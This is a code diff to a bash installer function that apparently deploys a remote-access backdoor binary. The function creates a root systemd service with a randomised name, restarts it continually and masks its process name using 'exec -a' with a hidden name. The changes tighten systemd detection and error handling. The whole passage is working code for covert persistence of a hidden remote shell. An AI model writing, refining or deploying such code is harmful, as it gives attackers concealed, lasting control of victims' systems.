@@ -290,12 +290,13 @@ create_qs_dir() {
 
 install_system_systemd(){
 	[[ ! -d "/etc/systemd/system" ]] && print_verbose "/etc/systemd/system not found!" && return 1
-	command -v systemctl >$ERR_LOG || print_verbose "systemctl not found!" && return 1
-	[[ "$(systemctl is-system-running 2>$ERR_LOG)" = *"offline"* ]] &>$ERR_LOG && print_verbose "Systemd is not running!" && return 1
+	[[ ! -f $(command -v systemctl) ]] && print_verbose "systemctl not found!" && return 1
+	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && print_verbose "systemd is not running!" && return 1
 	if [[ -f "${SERVICE_FILE}" ]]; then	
 		print_error "${SERVICE_FILE} already exists."
 		return 0
 	fi
+	print_verbose "Systemd dervice name: $RAND_NAME"
 
 	# Create the service file
 	echo "[Unit]
@@ -307,13 +308,13 @@ Type=simple
 Restart=always
 RestartSec=10
 WorkingDirectory=/root
-ExecStart=/bin/bash -c \"pidof $QS_PATH|| QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\"
+ExecStart=/bin/bash -c \"QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\"
  
 [Install]
-WantedBy=multi-user.target" >"${SERVICE_FILE}"
+WantedBy=multi-user.target" > "${SERVICE_FILE}"
 
 	chmod 600 "${SERVICE_FILE}"
-	systemctl enable "${RAND_NAME}" &>$ERR_LOG || { rm -f "${SERVICE_FILE}"; return; } # did not work... 
+	systemctl enable "${RAND_NAME}" &>$ERR_LOG || { print_verbose "Failed enabling service!"; rm -f "${SERVICE_FILE}"; return 1; } # did not work... 
 	return 0
 }
 
